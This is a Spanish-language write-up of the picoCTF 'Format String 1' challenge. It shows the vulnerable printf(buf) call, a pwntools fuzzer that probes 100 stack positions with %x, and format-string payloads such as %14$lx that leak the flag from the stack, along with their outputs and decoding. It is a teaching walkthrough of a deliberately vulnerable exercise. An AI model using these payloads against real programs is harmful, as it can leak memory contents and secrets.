# Format String 1

En este ejercicio nos dan un binario y su código en C.

El programa comprueba si existen tres archivos en el directorio actual:

* flag.txt
* secret\_menu\_item\_1
* secret\_menu\_item\_2

Si no existe alguno de esos archivos, el programa se aborta.

Cuando los tres archivos existen, el programa hace lo siguiente:

```c
./format-string-1
Give me your order and I'll read it back to you:
hola
Here's your order: hola
Bye!
```

El programa pide un input del usuario y nos devuelve lo que hemos puesto. Como el ejercicio se llama "format strings", vamos a comprobar si efectivamente es vulnerable a este tipo de ataque, revisando el código:

```c
printf("Give me your order and I'll read it back to you:\n");
fflush(stdout);
scanf("%1024s", buf);
printf("Here's your order: ");
printf(buf); // Aquí
```

Efectivamente, podemos ver que `printf(buf);` no tiene indicado el formato, por lo tanto es vulnerable a format strings.

```c
fd = fopen("flag.txt", "r");
if (fd == NULL){
    printf("'flag.txt' file not found, aborting.\n");
    return 1;
}
fgets(flag, 64, fd); // Aquí
```

Gracias al uso de `fgets`, el contenido de flag.txt se manda al stack, lo que nos permite aprovechar la vulnerabilidad para leer la flag.

He creado un fuzzer que hace un `%x` en las primeras 100 posiciones, lo que permite ver en formato hexadecimal los 100 elementos más cercanos a la cima del stack:

```python
for i in range(100):
    try:
        p = process(level='error')
        p.sendlineafter(b'Give me your order', '%{}$x'.format(i).encode())
        result = p.recvuntil(b'Bye!')
        print(str(i) + ': ' + str(result))
        p.close()
    except EOFError:
        pass
```

Resultado parcial de la ejecución:

```bash
14: b" and I'll read it back to you:\nHere's your order: 41414141\nBye!"
```

En la posición 14 obtenemos `41414141`, que corresponde a `AAAA` en hexadecimal, contenido que colocamos previamente en `flag.txt`.

Ya que sabemos en qué posición se encuentra, creamos un payload que imprima esa posición:

```c
%14$x
```

Ejecutándolo:

```c
Give me your order and I'll read it back to you:
%14$x
Here's your order: 6f636970
Bye!
```

Pasando de hexadecimal a ASCII:

```c
6f636970 → "ocip"
```

Está al revés, lo que indica que la flag está en bloques en orden inverso. Probamos con más posiciones:

```c
%14$x,%15$x,%16$x,%17$x,%18$x
```

Resultado:

```c
Here's your order: 6f636970,6d316e34,33317937,3431665f,64663533
```

Pasado a ASCII:

```
ocipm1n431y741f_df53
```

Revirtiendo los bloques:c

```
pico4n1m7y13_f1435fd
```

Esto aún no es correcto. Al investigar, nos damos cuenta de que el binario es de 64 bits, y estamos usando `%x`, que saca 32 bits. Cambiamos a `%lx` para obtener 64 bits:

```c
%14$lx,%15$lx,%16$lx,%17$lx,%18$lx
```

Resultado:

```c
Here's your order: 7b4654436f636970,355f31346d316e34,3478345f33317937,31395f673431665f,7d653464663533
```

Pasado a texto:

```c
picoCTF{SECRETO}
```

Tenemos la flag!
